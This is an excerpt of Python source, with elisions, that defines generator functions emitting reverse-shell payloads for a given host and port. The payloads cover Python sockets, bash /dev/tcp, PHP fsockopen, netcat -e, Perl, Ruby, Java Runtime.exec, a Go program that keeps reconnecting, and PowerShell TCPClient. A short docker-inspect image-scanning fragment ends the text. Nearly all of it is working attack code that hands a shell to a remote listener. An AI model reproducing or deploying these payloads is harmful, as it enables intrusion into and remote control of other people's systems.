...
Q = chr(34)  # double-quote, used to dodge JS-template-literal escaping issues
def _py(h, p):
    return ("python3 -c 'import socket,subprocess,os;s=socket.socket();"
            "s.connect((" + Q + str(h) + Q + "," + str(p) + "));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "subprocess.call([" + Q + "/bin/sh" + Q + "])'")
def _bash(h, p):    return "bash -i >& /dev/tcp/" + str(h) + "/" + str(p) + " 0>&1"
def _php(h, p):
    return ("php -r '$s=fsockopen(" + Q + str(h) + Q + "," + str(p) + ");"
            "exec(" + Q + "/bin/sh -i <&3 >&3 2>&3" + Q + ");'")
def _nc(h, p):      return "nc -e /bin/sh " + str(h) + " " + str(p)
def _perl(h, p):
    return ("perl -e 'use Socket;$i=" + Q + str(h) + Q + ";$p=" + str(p) + ";"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(" + Q + "tcp" + Q + "));"
            ...
            "exec(" + Q + "/bin/sh -i" + Q + ");'")
def _ruby(h, p):
    return ("ruby -rsocket -e 'exit if fork;"
            "c=TCPSocket.new(" + Q + str(h) + Q + "," + str(p) + ");"
            "while cmd=c.gets;IO.popen(cmd," + Q + "r" + Q + "){|io|c.print io.read}end'")
def _java(h, p):
    return ("Runtime r=Runtime.getRuntime();"
            "String[] c={" + Q + "bash" + Q + "," + Q + "-c" + Q + ","
            + Q + "exec 5<>/dev/tcp/" + str(h) + "/" + str(p)
            + ";cat <&5|while read line; do $line 2>&5 >&5; done" + Q + "};"
            "Process p2=r.exec(c);")
def _go(h, p):
    NL = chr(10)
    return (
        "package main" + NL
        + "import (" + Q + "net" + Q + ";" + Q + "os/exec" + Q + ";" + Q + "time" + Q + ")" + NL
        + "func main() {" + NL
        + "    for {" + NL
        + "        c, err := net.Dial(" + Q + "tcp" + Q + ", " + Q + str(h) + ":" + str(p) + Q + ")" + NL
        + "        if err != nil { time.Sleep(5*time.Second); continue }" + NL
        + "        cmd := exec.Command(" + Q + "/bin/sh" + Q + ")" + NL
        + "        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c" + NL
        + "        cmd.Run()" + NL
        + "    }" + NL
        + "}"
    )
def _ps(h, p):
    return ("$c=New-Object System.Net.Sockets.TCPClient('" + str(h) + "'," + str(p) + ");"
...
def scan_image(image: str) -> list[dict]:
    ...
    result = subprocess.run(["docker", "inspect", "--format", "{{.Id}}", image],
